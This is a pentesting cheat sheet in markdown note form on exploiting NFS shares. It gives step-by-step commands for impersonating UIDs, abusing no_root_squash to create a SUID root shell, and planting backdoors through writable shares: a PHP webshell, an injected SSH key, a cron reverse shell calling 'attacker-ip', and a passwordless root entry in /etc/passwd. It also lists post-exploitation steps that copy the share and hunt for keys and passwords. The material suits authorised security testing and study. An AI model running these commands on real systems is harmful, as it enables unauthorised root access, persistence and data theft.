---
id: Exploitation
aliases:
  - Network File System
tags:
  - Networking/Services/NFS/Exploitation
links: "[[Services]]"
---

# Exploitation

<!-- UID Manipulation {{{-->
## UID Manipulation

With
[UID Manipulation](https://hackviser.com/tactics/pentesting/services/nfs#uid-manipulation)
(or [Trusting UID and GID](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html#trusting-uid-and-gid))
it is possible to impersonate an arbitrary user
(*or* `root` *(*`UID` *0)* *if* `no_root_squash` *is enabled*)
which the remote file system trusts

1. Check file ownership on the share

> [!example]-
>
> ```sh
> ls -lan /mnt/nfs
> # e.g., file owned by UID 1000
> ```

2. Create user with same UID

> [!example]-
>
> ```sh
> useradd -u 1000 fakeuser
> ```

3. Switch to the new user

> [!example]-
>
> ```sh
> su fakeuser
> ```

4. Mount share

> [!example]-
>
>```sh
>mount -t nfs <target_ip>:/<share> /mnt/nfs
>```

5. It is now possible to read/write files owned by UID 1000

> [!example]-
>
> ```
> cat /mnt/nfs/sensitive_file.txt
> ```

> [!tip]
>
> The tool [fuse_nfs](https://github.com/hvs-consulting/nfs-security-tooling)
> will send the needed `UID` and `GID` to access the file(s)

<!-- }}} -->

<!-- No Root Squashing {{{-->
## No Root Squashing

When root squashing (`no_root_squash`) is disabled, the `root` user
on the client maintains `root` privileges on the NFS share,
allowing privilege escalation

1. Check if `no_root_squash` is set

> [!example]-
>
> ```sh
> showmount -e <target_ip>
> ```
>
> > [!tip]
> >
> > Look for `no_root_squash` in output

2. Mount share

> [!example]-
>
> ```sh
> mount -t nfs <target_ip>:/<share> /mnt/nfs
> ```

3. Create file as `root`

> [!example]-
>
> ```sh
> echo "test" > /mnt/nfs/root_file.txt
> ```

4. Check file permissions

> [!example]-
>
> ```sh
> ls -la /mnt/nfs/root_file.txt
> ```
> ```sh
> -rw-r--r-- 1 root root
> ```

5. Create [[Permissions#SUID & SGID|SUID]] shell

> [!example]-
>
> ```
> cp /bin/bash /mnt/nfs/rootbash
> ```
> ```sh
> chmod +s /mnt/nfs/rootbash
> ```

6. Execute on the target system

> [!example]-
>
> ```sh
> ./rootbash -p
> ```

<!-- }}} -->

<!-- Writable Share Exploitation {{{-->
## Writable Share Exploitation

[Writable Share Exploitation](https://hackviser.com/tactics/pentesting/services/nfs#writable-share-exploitation)
allows to upload backdoors, modify system files, or inject malicious code

<!-- Example {{{-->
> [!example]-
>
> Upload PHP webshell (*if web accessible*)
>
> > [!example]-
> >
> > ```sh
> > cp shell.php /mnt/nfs/var/www/html/shell.php
> > ```
>
> Upload SSH key
>
> > [!example]-
> >
> > ```sh
> > mkdir -p /mnt/nfs/root/.ssh
> > ```
> > ```sh
> > cp id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys
> > ```
> > ```sh
> > chmod 600 /mnt/nfs/root/.ssh/authorized_keys
> > ```
>
> Upload [[Privesc/Scheduled Tasks|cron job]]
>
> > [!example]-
> >
> >```sh
> >echo "* * * * * root bash -i >& /dev/tcp/attacker-ip/4444 0>&1" > /mnt/nfs/etc/cron.d/backdoor
> >```
>
> Upload `/etc/passwd` backdoor
>
> > [!example]-
> >
> >```sh
> >echo "backdoor::0:0:root:/root:/bin/bash" >> /mnt/nfs/etc/passwd
> >```
<!-- }}} -->

<!-- }}} -->

<!-- NSFShell {{{-->
## NSFShell

List, mount and change `UID` and `GID` to have access to files with
[nfsshell](https://github.com/Supermathie/nfsshell)

<!-- }}} -->

<!-- Post-Exploitation {{{-->
## Post-Exploitation

Copy entire share

> [!example]-
>
>```sh
>rsync -av /mnt/nfs/ /tmp/exfiltrated_data/
>```

Compress and download (*from target to attacker machine*)

> [!example]-
>
> ```sh
> tar czf nfs_data.tar.gz /mnt/nfs
> ```

Find sensitive files

> [!example]-
>
> ```sh
> find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "*password*"
> ```

<!-- }}} -->

<!-- }}} -->
